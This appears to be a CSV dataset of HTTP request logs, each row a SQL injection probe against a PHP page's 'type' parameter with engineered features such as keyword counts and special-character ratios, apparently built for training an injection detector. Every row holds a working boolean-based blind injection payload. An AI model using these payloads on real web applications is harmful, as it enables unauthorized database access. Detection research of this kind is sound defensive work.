full_url,parsed_url,event_time,hostname,sql_keyword,params_length,request_volume,special_chars,value_to_length
/details.php?prod=5&type=2%29%20AND%208160%3D%28SELECT%20%28CASE%20WHEN%20%288160%3D5373%29%20THEN%208160%20ELSE%20%28SELECT%205373%20UNION%20SELECT%207398%29%20END%29%29--%20-,/details.php?prod=5&type=2) AND 8160=(SELECT (CASE WHEN (8160=5373) THEN 8160 ELSE (SELECT 5373 UNION SELECT 7398) END))-- -,1680093125.455223,10.0.2.31,5,100,220.4,1,6.0
/details.php?prod=5&type=2%29%20AND%204553%3D%28SELECT%20%28CASE%20WHEN%20%284553%3D4553%29%20THEN%204553%20ELSE%20%28SELECT%202572%20UNION%20SELECT%207484%29%20END%29%29--%20-,/details.php?prod=5&type=2) AND 4553=(SELECT (CASE WHEN (4553=4553) THEN 4553 ELSE (SELECT 2572 UNION SELECT 7484) END))-- -,1680093125.458632,10.0.2.31,5,100,220.4,1,6.0
/details.php?prod=5&type=2%29%29%20AND%201567%3D%28SELECT%20%28CASE%20WHEN%20%281567%3D3560%29%20THEN%201567%20ELSE%20%28SELECT%203560%20UNION%20SELECT%201549%29%20END%29%29--%20-,/details.php?prod=5&type=2)) AND 1567=(SELECT (CASE WHEN (1567=3560) THEN 1567 ELSE (SELECT 3560 UNION SELECT 1549) END))-- -,1680093125.466043,10.0.2.31,5,101,220.4,1,5.9405940594059405
/details.php?prod=5&type=2%29%29%20AND%204553%3D%28SELECT%20%28CASE%20WHEN%20%284553%3D4553%29%20THEN%204553%20ELSE%20%28SELECT%202572%20UNION%20SELECT%207484%29%20END%29%29--%20-,/details.php?prod=5&type=2)) AND 4553=(SELECT (CASE WHEN (4553=4553) THEN 4553 ELSE (SELECT 2572 UNION SELECT 7484) END))-- -,1680093125.474709,10.0.2.31,5,101,220.4,1,5.9405940594059405
/details.php?prod=5&type=2%20AND%208271%3D%28SELECT%20%28CASE%20WHEN%20%288271%3D4783%29%20THEN%208271%20ELSE%20%28SELECT%204783%20UNION%20SELECT%208954%29%20END%29%29--%20-,/details.php?prod=5&type=2 AND 8271=(SELECT (CASE WHEN (8271=4783) THEN 8271 ELSE (SELECT 4783 UNION SELECT 8954) END))-- -,1680093125.48276,10.0.2.31,5,99,220.4,1,6.0606060606060606
/details.php?prod=5&type=2%20AND%204553%3D%28SELECT%20%28CASE%20WHEN%20%284553%3D4553%29%20THEN%204553%20ELSE%20%28SELECT%202572%20UNION%20SELECT%207484%29%20END%29%29--%20-,/details.php?prod=5&type=2 AND 4553=(SELECT (CASE WHEN (4553=4553) THEN 4553 ELSE (SELECT 2572 UNION SELECT 7484) END))-- -,1680093125.49092,10.0.2.31,5,99,220.4,1,6.0606060606060606
/details.php?prod=5&type=2%27%29%20AND%201281%3D%28SELECT%20%28CASE%20WHEN%20%281281%3D8198%29%20THEN%201281%20ELSE%20%28SELECT%208198%20UNION%20SELECT%202680%29%20END%29%29--%20-,/details.php?prod=5&type=2') AND 1281=(SELECT (CASE WHEN (1281=8198) THEN 1281 ELSE (SELECT 8198 UNION SELECT 2680) END))-- -,1680093125.495722,10.0.2.31,5,101,220.4,2,6.930693069306931
/details.php?prod=5&type=2%27%29%20AND%204553%3D%28SELECT%20%28CASE%20WHEN%20%284553%3D4553%29%20THEN%204553%20ELSE%20%28SELECT%202572%20UNION%20SELECT%207484%29%20END%29%29--%20-,/details.php?prod=5&type=2') AND 4553=(SELECT (CASE WHEN (4553=4553) THEN 4553 ELSE (SELECT 2572 UNION SELECT 7484) END))-- -,1680093125.508104,10.0.2.31,5,101,220.4,2,6.930693069306931
/details.php?prod=5&type=2%27%29%29%20AND%206022%3D%28SELECT%20%28CASE%20WHEN%20%286022%3D5584%29%20THEN%206022%20ELSE%20%28SELECT%205584%20UNION%20SELECT%209180%29%20END%29%29--%20-,/details.php?prod=5&type=2')) AND 6022=(SELECT (CASE WHEN (6022=5584) THEN 6022 ELSE (SELECT 5584 UNION SELECT 9180) END))-- -,1680093125.512801,10.0.2.31,5,102,220.4,2,6.862745098039215
/details.php?prod=5&type=2%27%29%29%20AND%204553%3D%28SELECT%20%28CASE%20WHEN%20%284553%3D4553%29%20THEN%204553%20ELSE%20%28SELECT%202572%20UNION%20SELECT%207484%29%20END%29%29--%20-,/details.php?prod=5&type=2')) AND 4553=(SELECT (CASE WHEN (4553=4553) THEN 4553 ELSE (SELECT 2572 UNION SELECT 7484) END))-- -,1680093125.517713,10.0.2.31,5,102,220.4,2,6.862745098039215
/details.php?prod=5&type=2%27%20AND%204447%3D%28SELECT%20%28CASE%20WHEN%20%284447%3D7412%29%20THEN%204447%20ELSE%20%28SELECT%207412%20UNION%20SELECT%205011%29%20END%29%29--%20-,/details.php?prod=5&type=2' AND 4447=(SELECT (CASE WHEN (4447=7412) THEN 4447 ELSE (SELECT 7412 UNION SELECT 5011) END))-- -,1680093125.52181,10.0.2.31,5,100,220.4,2,7.0
/details.php?prod=5&type=2%27%20AND%204553%3D%28SELECT%20%28CASE%20WHEN%20%284553%3D4553%29%20THEN%204553%20ELSE%20%28SELECT%202572%20UNION%20SELECT%207484%29%20END%29%29--%20-,/details.php?prod=5&type=2' AND 4553=(SELECT (CASE WHEN (4553=4553) THEN 4553 ELSE (SELECT 2572 UNION SELECT 7484) END))-- -,1680093125.525509,10.0.2.31,5,100,220.4,2,7.0
/details.php?prod=5&type=2%25%27%20AND%207006%3D%28SELECT%20%28CASE%20WHEN%20%287006%3D8044%29%20THEN%207006%20ELSE%20%28SELECT%208044%20UNION%20SELECT%206189%29%20END%29%29--%20-,/details.php?prod=5&type=2%' AND 7006=(SELECT (CASE WHEN (7006=8044) THEN 7006 ELSE (SELECT 8044 UNION SELECT 6189) END))-- -,1680093125.529501,10.0.2.31,5,101,220.4,2,6.930693069306931
/details.php?prod=5&type=2%25%27%20AND%204553%3D%28SELECT%20%28CASE%20WHEN%20%284553%3D4553%29%20THEN%204553%20ELSE%20%28SELECT%202572%20UNION%20SELECT%207484%29%20END%29%29--%20-,/details.php?prod=5&type=2%' AND 4553=(SELECT (CASE WHEN (4553=4553) THEN 4553 ELSE (SELECT 2572 UNION SELECT 7484) END))-- -,1680093125.533801,10.0.2.31,5,101,220.4,2,6.930693069306931
/details.php?prod=5&type=2%22%29%20AND%204773%3D%28SELECT%20%28CASE%20WHEN%20%284773%3D4426%29%20THEN%204773%20ELSE%20%28SELECT%204426%20UNION%20SELECT%204308%29%20END%29%29--%20-,"/details.php?prod=5&type=2"") AND 4773=(SELECT (CASE WHEN (4773=4426) THEN 4773 ELSE (SELECT 4426 UNION SELECT 4308) END))-- -",1680093125.538074,10.0.2.31,5,101,220.4,2,6.930693069306931
/details.php?prod=5&type=2%22%29%20AND%204553%3D%28SELECT%20%28CASE%20WHEN%20%284553%3D4553%29%20THEN%204553%20ELSE%20%28SELECT%202572%20UNION%20SELECT%207484%29%20END%29%29--%20-,"/details.php?prod=5&type=2"") AND 4553=(SELECT (CASE WHEN (4553=4553) THEN 4553 ELSE (SELECT 2572 UNION SELECT 7484) END))-- -",1680093125.541491,10.0.2.31,5,101,220.4,2,6.930693069306931
/details.php?prod=5&type=2%22%20AND%208861%3D%28SELECT%20%28CASE%20WHEN%20%288861%3D3486%29%20THEN%208861%20ELSE%20%28SELECT%203486%20UNION%20SELECT%205845%29%20END%29%29--%20-,"/details.php?prod=5&type=2"" AND 8861=(SELECT (CASE WHEN (8861=3486) THEN 8861 ELSE (SELECT 3486 UNION SELECT 5845) END))-- -",1680093125.545557,10.0.2.31,5,100,220.4,2,7.0
/details.php?prod=5&type=2%22%20AND%204553%3D%28SELECT%20%28CASE%20WHEN%20%284553%3D4553%29%20THEN%204553%20ELSE%20%28SELECT%202572%20UNION%20SELECT%207484%29%20END%29%29--%20-,"/details.php?prod=5&type=2"" AND 4553=(SELECT (CASE WHEN (4553=4553) THEN 4553 ELSE (SELECT 2572 UNION SELECT 7484) END))-- -",1680093125.549207,10.0.2.31,5,100,220.4,2,7.0
/details.php?prod=5&type=2%29%20AND%201015%3D6206--%20-,/details.php?prod=5&type=2) AND 1015=6206-- -,1680093125.554445,10.0.2.31,1,21,220.4,1,9.523809523809524
/details.php?prod=5&type=2%29%20AND%201215%3D1215--%20-,/details.php?prod=5&type=2) AND 1215=1215-- -,1680093125.557888,10.0.2.31,1,21,220.4,1,9.523809523809524
/details.php?prod=5&type=2%29%29%20AND%206058%3D6275--%20-,/details.php?prod=5&type=2)) AND 6058=6275-- -,1680093125.561295,10.0.2.31,1,22,220.4,1,9.090909090909092
/details.php?prod=5&type=2%29%29%20AND%201215%3D1215--%20-,/details.php?prod=5&type=2)) AND 1215=1215-- -,1680093125.566205,10.0.2.31,1,22,220.4,1,9.090909090909092
/details.php?prod=5&type=2%20AND%205669%3D9841--%20-,/details.php?prod=5&type=2 AND 5669=9841-- -,1680093125.57046,10.0.2.31,1,20,220.4,1,10.0
/details.php?prod=5&type=2%20AND%201215%3D1215--%20-,/details.php?prod=5&type=2 AND 1215=1215-- -,1680093125.579257,10.0.2.31,1,20,220.4,1,10.0
/details.php?prod=5&type=2%27%29%20AND%201967%3D7381--%20-,/details.php?prod=5&type=2') AND 1967=7381-- -,1680093125.586012,10.0.2.31,1,22,220.4,2,13.636363636363637
/details.php?prod=5&type=2%27%29%20AND%201215%3D1215--%20-,/details.php?prod=5&type=2') AND 1215=1215-- -,1680093125.589673,10.0.2.31,1,22,220.4,2,13.636363636363637
/details.php?prod=5&type=2%27%29%29%20AND%207084%3D3648--%20-,/details.php?prod=5&type=2')) AND 7084=3648-- -,1680093125.602478,10.0.2.31,1,23,220.4,2,13.043478260869565
/details.php?prod=5&type=2%27%29%29%20AND%201215%3D1215--%20-,/details.php?prod=5&type=2')) AND 1215=1215-- -,1680093125.606476,10.0.2.31,1,23,220.4,2,13.043478260869565
/details.php?prod=5&type=2%27%20AND%205006%3D6519--%20-,/details.php?prod=5&type=2' AND 5006=6519-- -,1680093125.610819,10.0.2.31,1,21,220.4,2,14.285714285714286
/details.php?prod=5&type=2%27%20AND%201215%3D1215--%20-,/details.php?prod=5&type=2' AND 1215=1215-- -,1680093125.614109,10.0.2.31,1,21,220.4,2,14.285714285714286
/details.php?prod=5&type=2%25%27%20AND%202371%3D4521--%20-,/details.php?prod=5&type=2%' AND 2371=4521-- -,1680093125.619888,10.0.2.31,1,22,220.4,2,13.636363636363637
/details.php?prod=5&type=2%25%27%20AND%201215%3D1215--%20-,/details.php?prod=5&type=2%' AND 1215=1215-- -,1680093125.623103,10.0.2.31,1,22,220.4,2,13.636363636363637
/details.php?prod=5&type=2%22%29%20AND%206749%3D2711--%20-,"/details.php?prod=5&type=2"") AND 6749=2711-- -",1680093125.627757,10.0.2.31,1,22,220.4,2,13.636363636363637
/details.php?prod=5&type=2%22%29%20AND%201215%3D1215--%20-,"/details.php?prod=5&type=2"") AND 1215=1215-- -",1680093125.632054,10.0.2.31,1,22,220.4,2,13.636363636363637
/details.php?prod=5&type=2%22%20AND%203973%3D5645--%20-,"/details.php?prod=5&type=2"" AND 3973=5645-- -",1680093125.636154,10.0.2.31,1,21,220.4,2,14.285714285714286
/details.php?prod=5&type=2%22%20AND%201215%3D1215--%20-,"/details.php?prod=5&type=2"" AND 1215=1215-- -",1680093125.639631,10.0.2.31,1,21,220.4,2,14.285714285714286
/details.php?prod=5&type=%28SELECT%20%28CASE%20WHEN%20%282756%3D1612%29%20THEN%202%20ELSE%20%28SELECT%201612%20UNION%20SELECT%202191%29%20END%29%29,/details.php?prod=5&type=(SELECT (CASE WHEN (2756=1612) THEN 2 ELSE (SELECT 1612 UNION SELECT 2191) END)),1680093125.643685,10.0.2.31,4,81,220.4,0,4.938271604938271
/details.php?prod=5&type=%28SELECT%20%28CASE%20WHEN%20%288554%3D8554%29%20THEN%202%20ELSE%20%28SELECT%205179%20UNION%20SELECT%206198%29%20END%29%29,/details.php?prod=5&type=(SELECT (CASE WHEN (8554=8554) THEN 2 ELSE (SELECT 5179 UNION SELECT 6198) END)),1680093125.646841,10.0.2.31,4,81,220.4,0,4.938271604938271
/details.php?prod=5&type=%28CASE%20WHEN%20%285698%3D4582%29%20THEN%205698%20ELSE%205698%2A%28SELECT%205698%20FROM%20DUAL%20UNION%20SELECT%204582%20FROM%20DUAL%29%20END%29,/details.php?prod=5&type=(CASE WHEN (5698=4582) THEN 5698 ELSE 5698*(SELECT 5698 FROM DUAL UNION SELECT 4582 FROM DUAL) END),1680093125.651401,10.0.2.31,5,100,220.4,0,5.0
/details.php?prod=5&type=%28CASE%20WHEN%20%284726%3D4726%29%20THEN%204726%20ELSE%204726%2A%28SELECT%204726%20FROM%20DUAL%20UNION%20SELECT%209486%20FROM%20DUAL%29%20END%29,/details.php?prod=5&type=(CASE WHEN (4726=4726) THEN 4726 ELSE 4726*(SELECT 4726 FROM DUAL UNION SELECT 9486 FROM DUAL) END),1680093125.666968,10.0.2.31,5,100,220.4,0,5.0
/details.php?prod=5&type=%28CASE%20WHEN%206130%3D9727%20THEN%206130%20ELSE%20NULL%20END%29,/details.php?prod=5&type=(CASE WHEN 6130=9727 THEN 6130 ELSE NULL END),1680093125.671824,10.0.2.31,2,46,220.4,0,4.3478260869565215
/details.php?prod=5&type=%28CASE%20WHEN%209099%3D9099%20THEN%209099%20ELSE%20NULL%20END%29,/details.php?prod=5&type=(CASE WHEN 9099=9099 THEN 9099 ELSE NULL END),1680093125.676906,10.0.2.31,2,46,220.4,0,4.3478260869565215
/details.php?prod=5&type=%28SELECT%20CONCAT%28CONCAT%280x7176787171%2C%28CASE%20WHEN%20%289673%3D9673%29%20THEN%200x31%20ELSE%200x30%20END%29%29%2C0x7178706a71%29%29,"/details.php?prod=5&type=(SELECT CONCAT(CONCAT(0x7176787171,(CASE WHEN (9673=9673) THEN 0x31 ELSE 0x30 END)),0x7178706a71))",1680093125.688822,10.0.2.31,3,99,220.4,0,3.0303030303030303
/details.php?prod=5&type=2%29%20AND%209849%3D5519%23,/details.php?prod=5&type=2) AND 9849=5519#,1680093125.694248,10.0.2.31,1,18,220.4,1,11.11111111111111
/details.php?prod=5&type=2%29%20AND%202569%3D2569%23,/details.php?prod=5&type=2) AND 2569=2569#,1680093125.698166,10.0.2.31,1,18,220.4,1,11.11111111111111
/details.php?prod=5&type=2%29%29%20AND%202995%3D3620%23,/details.php?prod=5&type=2)) AND 2995=3620#,1680093125.703361,10.0.2.31,1,19,220.4,1,10.526315789473685
/details.php?prod=5&type=2%29%29%20AND%202569%3D2569%23,/details.php?prod=5&type=2)) AND 2569=2569#,1680093125.708239,10.0.2.31,1,19,220.4,1,10.526315789473685
/details.php?prod=5&type=2%29%29%29%20AND%208247%3D7956%23,/details.php?prod=5&type=2))) AND 8247=7956#,1680093125.721821,10.0.2.31,1,20,220.4,1,10.0
/details.php?prod=5&type=2%29%29%29%20AND%202569%3D2569%23,/details.php?prod=5&type=2))) AND 2569=2569#,1680093125.726216,10.0.2.31,1,20,220.4,1,10.0
/details.php?prod=5&type=2%20AND%201812%3D6518%23,/details.php?prod=5&type=2 AND 1812=6518#,1680093125.739081,10.0.2.31,1,17,220.4,1,11.764705882352942
/details.php?prod=5&type=2%20AND%202569%3D2569%23,/details.php?prod=5&type=2 AND 2569=2569#,1680093125.742339,10.0.2.31,1,17,220.4,1,11.764705882352942
/details.php?prod=5&type=2%29%29%20AS%20WObP%20WHERE%204865%3D4865%20AND%203612%3D4038%23,/details.php?prod=5&type=2)) AS WObP WHERE 4865=4865 AND 3612=4038#,1680093125.746845,10.0.2.31,3,43,220.4,1,9.30232558139535
/details.php?prod=5&type=2%29%29%20AS%20FhHR%20WHERE%204731%3D4731%20AND%202569%3D2569%23,/details.php?prod=5&type=2)) AS FhHR WHERE 4731=4731 AND 2569=2569#,1680093125.751525,10.0.2.31,3,43,220.4,1,9.30232558139535
/details.php?prod=5&type=2%29%20AS%20yZJD%20WHERE%202652%3D2652%20AND%202329%3D8859%23,/details.php?prod=5&type=2) AS yZJD WHERE 2652=2652 AND 2329=8859#,1680093125.75534,10.0.2.31,3,42,220.4,1,9.523809523809524
/details.php?prod=5&type=2%29%20AS%20Ddws%20WHERE%208167%3D8167%20AND%202569%3D2569%23,/details.php?prod=5&type=2) AS Ddws WHERE 8167=8167 AND 2569=2569#,1680093125.758757,10.0.2.31,3,42,220.4,1,9.523809523809524
/details.php?prod=5&type=2%60%20WHERE%206743%3D6743%20AND%209144%3D7423%23,/details.php?prod=5&type=2` WHERE 6743=6743 AND 9144=7423#,1680093125.762548,10.0.2.31,2,34,220.4,1,8.823529411764707
/details.php?prod=5&type=2%60%20WHERE%203631%3D3631%20AND%202569%3D2569%23,/details.php?prod=5&type=2` WHERE 3631=3631 AND 2569=2569#,1680093125.765921,10.0.2.31,2,34,220.4,1,8.823529411764707
/details.php?prod=5&type=2%60%29%20WHERE%208528%3D8528%20AND%207285%3D1370%23,/details.php?prod=5&type=2`) WHERE 8528=8528 AND 7285=1370#,1680093125.770623,10.0.2.31,2,35,220.4,1,8.571428571428571
/details.php?prod=5&type=2%60%29%20WHERE%207743%3D7743%20AND%202569%3D2569%23,/details.php?prod=5&type=2`) WHERE 7743=7743 AND 2569=2569#,1680093125.773851,10.0.2.31,2,35,220.4,1,8.571428571428571
/details.php?prod=5&type=2%27%29%20AND%201929%3D4579%23,/details.php?prod=5&type=2') AND 1929=4579#,1680093125.777067,10.0.2.31,1,19,220.4,2,15.789473684210526
/details.php?prod=5&type=2%27%29%20AND%202569%3D2569%23,/details.php?prod=5&type=2') AND 2569=2569#,1680093125.780159,10.0.2.31,1,19,220.4,2,15.789473684210526
/details.php?prod=5&type=2%27%20AND%204887%3D1900%23,/details.php?prod=5&type=2' AND 4887=1900#,1680093125.784659,10.0.2.31,1,18,220.4,2,16.666666666666668
/details.php?prod=5&type=2%27%20AND%202569%3D2569%23,/details.php?prod=5&type=2' AND 2569=2569#,1680093125.787439,10.0.2.31,1,18,220.4,2,16.666666666666668
/details.php?prod=5&type=2%22%20AND%201467%3D1200%23,"/details.php?prod=5&type=2"" AND 1467=1200#",1680093125.790975,10.0.2.31,1,18,220.4,2,16.666666666666668
/details.php?prod=5&type=2%22%20AND%202569%3D2569%23,"/details.php?prod=5&type=2"" AND 2569=2569#",1680093125.794332,10.0.2.31,1,18,220.4,2,16.666666666666668
/details.php?prod=5&type=2%27%29%29%20AND%209837%3D5294%23,/details.php?prod=5&type=2')) AND 9837=5294#,1680093125.797636,10.0.2.31,1,20,220.4,2,15.0
/details.php?prod=5&type=2%27%29%29%20AND%202569%3D2569%23,/details.php?prod=5&type=2')) AND 2569=2569#,1680093125.80406,10.0.2.31,1,20,220.4,2,15.0
/details.php?prod=5&type=2%27%29%29%29%20AND%201626%3D2243%23,/details.php?prod=5&type=2'))) AND 1626=2243#,1680093125.807849,10.0.2.31,1,21,220.4,2,14.285714285714286
/details.php?prod=5&type=2%27%29%29%29%20AND%202569%3D2569%23,/details.php?prod=5&type=2'))) AND 2569=2569#,1680093125.810524,10.0.2.31,1,21,220.4,2,14.285714285714286
/details.php?prod=5&type=2%25%27%20AND%207472%3D3764%23,/details.php?prod=5&type=2%' AND 7472=3764#,1680093125.81445,10.0.2.31,1,19,220.4,2,15.789473684210526
/details.php?prod=5&type=2%25%27%20AND%202569%3D2569%23,/details.php?prod=5&type=2%' AND 2569=2569#,1680093125.818281,10.0.2.31,1,19,220.4,2,15.789473684210526
/details.php?prod=5&type=2%22%29%20AND%207980%3D7147%23,"/details.php?prod=5&type=2"") AND 7980=7147#",1680093125.821435,10.0.2.31,1,19,220.4,2,15.789473684210526
/details.php?prod=5&type=2%22%29%20AND%202569%3D2569%23,"/details.php?prod=5&type=2"") AND 2569=2569#",1680093125.825125,10.0.2.31,1,19,220.4,2,15.789473684210526
/details.php?prod=5&type=2%22%29%29%20AND%206577%3D7798%23,"/details.php?prod=5&type=2"")) AND 6577=7798#",1680093125.828491,10.0.2.31,1,20,220.4,2,15.0
/details.php?prod=5&type=2%22%29%29%20AND%202569%3D2569%23,"/details.php?prod=5&type=2"")) AND 2569=2569#",1680093125.83158,10.0.2.31,1,20,220.4,2,15.0
/details.php?prod=5&type=2%22%29%29%29%20AND%207773%3D5287%23,"/details.php?prod=5&type=2""))) AND 7773=5287#",1680093125.835362,10.0.2.31,1,21,220.4,2,14.285714285714286
/details.php?prod=5&type=2%22%29%29%29%20AND%202569%3D2569%23,"/details.php?prod=5&type=2""))) AND 2569=2569#",1680093125.838868,10.0.2.31,1,21,220.4,2,14.285714285714286
/details.php?prod=5&type=2%27%29%29%20AS%20vyye%20WHERE%202221%3D2221%20AND%202702%3D7648%23,/details.php?prod=5&type=2')) AS vyye WHERE 2221=2221 AND 2702=7648#,1680093125.843144,10.0.2.31,3,44,220.4,2,11.363636363636363
/details.php?prod=5&type=2%27%29%29%20AS%20NrTQ%20WHERE%202918%3D2918%20AND%202569%3D2569%23,/details.php?prod=5&type=2')) AS NrTQ WHERE 2918=2918 AND 2569=2569#,1680093125.846456,10.0.2.31,3,44,220.4,2,11.363636363636363
/details.php?prod=5&type=2%22%29%29%20AS%20sVIN%20WHERE%209425%3D9425%20AND%203662%3D2555%23,"/details.php?prod=5&type=2"")) AS sVIN WHERE 9425=9425 AND 3662=2555#",1680093125.850365,10.0.2.31,4,44,220.4,2,13.636363636363637
/details.php?prod=5&type=2%22%29%29%20AS%20ZAOq%20WHERE%202900%3D2900%20AND%202569%3D2569%23,"/details.php?prod=5&type=2"")) AS ZAOq WHERE 2900=2900 AND 2569=2569#",1680093125.853564,10.0.2.31,3,44,220.4,2,11.363636363636363
/details.php?prod=5&type=2%27%29%20AS%20iKdP%20WHERE%205326%3D5326%20AND%204429%3D7933%23,/details.php?prod=5&type=2') AS iKdP WHERE 5326=5326 AND 4429=7933#,1680093125.857269,10.0.2.31,3,43,220.4,2,11.627906976744185
/details.php?prod=5&type=2%27%29%20AS%20zybq%20WHERE%202936%3D2936%20AND%202569%3D2569%23,/details.php?prod=5&type=2') AS zybq WHERE 2936=2936 AND 2569=2569#,1680093125.860298,10.0.2.31,3,43,220.4,2,11.627906976744185
/details.php?prod=5&type=2%22%29%20AS%20Tkgk%20WHERE%206188%3D6188%20AND%203693%3D8359%23,"/details.php?prod=5&type=2"") AS Tkgk WHERE 6188=6188 AND 3693=8359#",1680093125.863896,10.0.2.31,3,43,220.4,2,11.627906976744185
/details.php?prod=5&type=2%22%29%20AS%20ahdr%20WHERE%204342%3D4342%20AND%202569%3D2569%23,"/details.php?prod=5&type=2"") AS ahdr WHERE 4342=4342 AND 2569=2569#",1680093125.867564,10.0.2.31,3,43,220.4,2,11.627906976744185
/details.php?prod=5&type=2%27%20IN%20BOOLEAN%20MODE%29%20AND%207670%3D9427%23,/details.php?prod=5&type=2' IN BOOLEAN MODE) AND 7670=9427#,1680093125.871097,10.0.2.31,2,35,220.4,2,11.428571428571429
/details.php?prod=5&type=2%27%20IN%20BOOLEAN%20MODE%29%20AND%202569%3D2569%23,/details.php?prod=5&type=2' IN BOOLEAN MODE) AND 2569=2569#,1680093125.874039,10.0.2.31,2,35,220.4,2,11.428571428571429
/details.php?prod=5&type=-8207,/details.php?prod=5&type=-8207,1680093125.87905,10.0.2.31,0,6,220.4,0,0.0
/details.php?prod=5&type=-9272%29%20OR%203169%3D5326%23,/details.php?prod=5&type=-9272) OR 3169=5326#,1680093125.883803,10.0.2.31,1,21,220.4,1,9.523809523809524
/details.php?prod=5&type=-3671%29%20OR%209083%3D9083%23,/details.php?prod=5&type=-3671) OR 9083=9083#,1680093125.887302,10.0.2.31,1,21,220.4,1,9.523809523809524
/details.php?prod=5&type=-4243%29%29%20OR%203787%3D6486%23,/details.php?prod=5&type=-4243)) OR 3787=6486#,1680093125.892643,10.0.2.31,1,22,220.4,1,9.090909090909092
/details.php?prod=5&type=-5718%29%29%20OR%209083%3D9083%23,/details.php?prod=5&type=-5718)) OR 9083=9083#,1680093125.896064,10.0.2.31,1,22,220.4,1,9.090909090909092
/details.php?prod=5&type=-6951%29%29%29%20OR%203722%3D7363%23,/details.php?prod=5&type=-6951))) OR 3722=7363#,1680093125.901566,10.0.2.31,1,23,220.4,1,8.695652173913043
/details.php?prod=5&type=-8590%29%29%29%20OR%209083%3D9083%23,/details.php?prod=5&type=-8590))) OR 9083=9083#,1680093125.905759,10.0.2.31,1,23,220.4,1,8.695652173913043
/details.php?prod=5&type=-8010%20OR%207745%3D4268%23,/details.php?prod=5&type=-8010 OR 7745=4268#,1680093125.912037,10.0.2.31,1,20,220.4,1,10.0
/details.php?prod=5&type=-8197%20OR%209083%3D9083%23,/details.php?prod=5&type=-8197 OR 9083=9083#,1680093125.924644,10.0.2.31,1,20,220.4,1,10.0
/details.php?prod=5&type=-2326%29%29%20AS%20RGIV%20WHERE%202303%3D2303%20OR%209477%3D4415%23,/details.php?prod=5&type=-2326)) AS RGIV WHERE 2303=2303 OR 9477=4415#,1680093125.929979,10.0.2.31,3,46,220.4,1,8.695652173913043
/details.php?prod=5&type=-2308%29%29%20AS%20UPqx%20WHERE%208622%3D8622%20OR%209083%3D9083%23,/details.php?prod=5&type=-2308)) AS UPqx WHERE 8622=8622 OR 9083=9083#,1680093125.947462,10.0.2.31,3,46,220.4,1,8.695652173913043
/details.php?prod=5&type=-3699%29%20AS%20GlCT%20WHERE%203266%3D3266%20OR%208477%3D5663%23,/details.php?prod=5&type=-3699) AS GlCT WHERE 3266=3266 OR 8477=5663#,1680093125.951724,10.0.2.31,3,45,220.4,1,8.88888888888889
/details.php?prod=5&type=-8664%29%20AS%20CDja%20WHERE%207237%3D7237%20OR%209083%3D9083%23,/details.php?prod=5&type=-8664) AS CDja WHERE 7237=7237 OR 9083=9083#,1680093125.955688,10.0.2.31,3,45,220.4,1,8.88888888888889
/details.php?prod=5&type=-7538%27%29%20OR%209339%3D9350%23,/details.php?prod=5&type=-7538') OR 9339=9350#,1680093125.95999,10.0.2.31,1,22,220.4,2,13.636363636363637
/details.php?prod=5&type=-1279%27%29%20OR%209083%3D9083%23,/details.php?prod=5&type=-1279') OR 9083=9083#,1680093125.963396,10.0.2.31,1,22,220.4,2,13.636363636363637
/details.php?prod=5&type=-5987%27%20OR%207686%3D9946%23,/details.php?prod=5&type=-5987' OR 7686=9946#,1680093125.96839,10.0.2.31,1,21,220.4,2,14.285714285714286
/details.php?prod=5&type=-3855%27%20OR%209083%3D9083%23,/details.php?prod=5&type=-3855' OR 9083=9083#,1680093125.972079,10.0.2.31,1,21,220.4,2,14.285714285714286
